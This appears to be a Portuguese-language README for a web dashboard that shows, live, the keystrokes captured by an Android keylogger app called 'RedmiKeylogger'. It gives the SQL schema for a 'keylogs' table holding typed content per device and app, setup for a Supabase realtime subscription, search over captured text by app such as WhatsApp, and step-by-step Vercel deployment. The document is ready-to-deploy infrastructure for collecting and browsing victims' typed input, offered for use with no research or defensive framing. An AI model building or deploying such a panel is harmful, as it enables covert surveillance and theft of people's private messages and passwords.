# RedmiKeylogger Dashboard (React + Vite + Supabase)

Dashboard web em tempo real desenvolvido com **React**, **Vite**, **Tailwind CSS** e **Supabase Realtime** (`@supabase/supabase-js`) para visualização e filtragem instantânea de eventos capturados pelo app Android `RedmiKeylogger`.

---

## 🚀 Recursos

- **Assinatura Realtime**: Escuta eventos `INSERT` via `postgres_changes` diretamente da tabela `keylogs` do Supabase.
- **Filtro em Tempo Real**: Campo de pesquisa dinâmico que filtra logs por nome do aplicativo, conteúdo digitado ou dispositivo.
- **Formatação de Pacotes**: Exibe apenas o último segmento do pacote (ex: `whatsapp` em vez de `com.whatsapp`).
- **Dark Mode Moderno**: Interface em tons escuros construída com Tailwind CSS e tipografia monoespaçada (`JetBrains Mono`, `Fira Code`) para os dados de input.
- **Status de Conexão**: Indicador visual que sinaliza se o canal Realtime do Supabase está ativo ou reconectando.

---

## 🛠️ Configuração da Tabela no Supabase

Certifique-se de que a tabela `keylogs` esteja criada no seu projeto Supabase e com a replicação Realtime habilitada:

```sql
create table public.keylogs (
  id bigint generated by default as identity primary key,
  created_at timestamp with time zone default timezone('utc'::text, now()) not null,
  device_model text,
  app_package text,
  input_content text,
  api_key text
);

-- Habilite o Realtime para a tabela keylogs
alter publication supabase_realtime add table public.keylogs;
```

## 💻 Executando Localmente

### 1. Pré-requisitos
- Node.js 18+ instalado.

### 2. Instalação das dependências
Navegue até a pasta `/dashboard`:

```bash
cd dashboard
npm install
```

### 3. Configuração de Variáveis de Ambiente
Crie um arquivo `.env` baseado no `.env.example`:

```bash
cp .env.example .env
```

Preencha com as credenciais do seu projeto Supabase:
```env
VITE_SUPABASE_URL=https://xyzcompany.supabase.co
VITE_SUPABASE_ANON_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6...
```

### 4. Rodar o servidor de desenvolvimento
```bash
npm run dev
```

Acesse no seu navegador: `http://localhost:5173`

## 🌐 Deploy na Vercel

### Opção 1: Via Vercel CLI

1. Instale o CLI globalmente (se não tiver):
   ```bash
   npm i -g vercel
   ```

2. Dentro da pasta `/dashboard`:
   ```bash
   vercel
   ```

3. Durante a configuração, confirme que o framework detectado é **Vite** e a pasta de saída é `dist`.

4. Defina as variáveis de ambiente quando solicitado ou pelo painel web da Vercel:
   - `VITE_SUPABASE_URL`
   - `VITE_SUPABASE_ANON_KEY`

5. Para deploy em produção:
   ```bash
   vercel --prod
   ```

---

### Opção 2: Via Git / Vercel Web Dashboard

1. Suba o repositório para o GitHub ou GitLab.
2. Acesse [vercel.com](https://vercel.com) e clique em **Add New Project**.
3. Importe o repositório e configure:
   - **Root Directory**: `dashboard`
   - **Framework Preset**: `Vite`
   - **Build Command**: `npm run build`
   - **Output Directory**: `dist`
4. Na seção **Environment Variables**, adicione:
   - `VITE_SUPABASE_URL`: sua URL do Supabase
   - `VITE_SUPABASE_ANON_KEY`: sua Anon Key do Supabase
5. Clique em **Deploy**.
